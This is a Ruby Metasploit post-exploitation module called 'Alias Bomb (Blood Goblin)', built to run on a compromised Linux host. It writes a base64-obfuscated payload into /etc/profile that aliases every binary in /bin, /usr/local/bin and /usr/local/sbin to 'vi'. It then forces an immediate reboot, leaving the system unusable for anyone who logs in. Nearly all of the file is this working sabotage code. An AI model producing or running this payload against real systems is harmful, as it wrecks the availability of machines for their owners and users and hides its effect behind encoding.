require 'msf/core'
require 'rex'
require 'msf/core/post/common'
 
class MetasploitModule < Msf::Post
 
 include Msf::Post::Common

 def initialize(info={})
     super( update_info( info,
         'Name' => 'Alias Bomb (Blood Goblin)',
         'Description' => %q{
             Aliases binaries to vi on linux.
         },
         'License' => MSF_LICENSE,
         'Author' => [
             'Tristan Fletcher #Cyclawps52',
         ],
         'Platform' => ['unix', 'linux'],
         'SessionTypes' => [ 'meterpreter', 'shell' ]
     ))
   
 end
 
 # Main method
 def run

    commandToRun = %q{
        echo -n "Zm9yIGJpbmFyeSBpbiBgbHMgL3Vzci9sb2NhbC9zYmluYDsgZG8gYWxpYXMgJGJpbj0ndmknOyBkb25lICYmIGZvciBiaW5hcnkgaW4gYGxzIC91c3IvbG9jYWwvYmluYDsgZG8gYWxpYXMgJGJpbmFyeT0ndmknOyBkb25lICYmIGZvciBiaW5hcnkgaW4gYGxzIC9iaW5gOyBkbyBhbGlhcyAkYmluYXJ5PSd2aSc7IGRvbmUK" | base64 -d >> /etc/profile && shutdown -r now
    }
    cmd_exec(commandToRun)
    print_status("All /usr/local/sbin, /usr/local/bin, and /bin binaries now mapped to vi.")


 end
 
end